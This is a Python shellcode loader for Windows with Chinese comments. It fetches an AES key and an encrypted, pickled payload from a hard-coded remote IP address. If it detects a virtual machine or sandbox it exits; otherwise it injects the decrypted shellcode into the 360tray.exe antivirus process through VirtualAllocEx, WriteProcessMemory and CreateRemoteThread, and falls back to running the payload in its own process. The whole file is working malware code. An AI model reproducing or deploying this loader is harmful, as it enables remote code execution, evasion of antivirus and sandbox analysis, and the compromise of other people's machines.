import psutil
import requests
import ctypes
import pickle
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import vm_check
import obfuscation

# 配置文件的 URL
keywords_url = 'http://118.178.229.36:9888/UPLOADS/keywords.txt'
shellcode_url = 'http://118.178.229.36:9888/UPLOADS/encrypted_shellcode.pkl'

# 获取 keywords.txt 内容
keywords_response = requests.get(keywords_url)
if keywords_response.status_code == 200:
    keywords = keywords_response.text.splitlines()
    key = base64.b64decode(keywords[0].strip())
    iv = base64.b64decode(keywords[1].strip())
else:
    print("Failed to fetch keywords.txt")
    exit()

# 获取 encrypted_shellcode.pkl 内容
shellcode_response = requests.get(shellcode_url)
if shellcode_response.status_code == 200:
    B64EnShellcode = pickle.loads(shellcode_response.content)
    encrypted_shellcode = base64.b64decode(B64EnShellcode)
else:
    print("Failed to fetch encrypted_shellcode.pkl")
    exit()

# 解密 shellcode
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
unpadder = PKCS7(algorithms.AES.block_size).unpadder()

decrypted_padded_shellcode = decryptor.update(encrypted_shellcode) + decryptor.finalize()
shellcode = unpadder.update(decrypted_padded_shellcode) + unpadder.finalize()

# 检测虚拟机环境
r = vm_check.numberOfCPU() + vm_check.physicalMemory() + vm_check.check_virtual() + vm_check.check_file()
if r < 4 or vm_check.is_sandbox():  # 判断是否为虚拟机
    exit()
else:
    obfuscation.addTrash()

    # 查找 Notepad 进程
    notepad_pid = None
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'] == '360tray.exe':
            notepad_pid = proc.info['pid']
            print(notepad_pid)
            break

    if notepad_pid:
        # 打开 Notepad 进程
        PROCESS_ALL_ACCESS = 0x1F0FFF
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, notepad_pid)
        if not process_handle:
            print("Failed to open Notepad process.")
            exit()

        # 分配内存并写入 shellcode
        shellcode_size = len(shellcode)
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, shellcode_size, 0x3000, 0x40)
        written = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.WriteProcessMemory(process_handle, arg_address, shellcode, shellcode_size,
                                                  ctypes.byref(written))

        # 创建远程线程执行 shellcode
        thread_id = ctypes.c_ulong(0)
        if not ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, arg_address, 0, 0,
                                                         ctypes.byref(thread_id)):
            print("Failed to create remote thread.")
            exit()

        print("Shellcode injected into Notepad process.")
        ctypes.windll.kernel32.CloseHandle(process_handle)
    else:
        sc = b'\x90' * 16 + shellcode
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        rusage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rusage), ctypes.create_string_buffer(sc), len(sc))
        handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rusage), 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    obfuscation.addTrash()







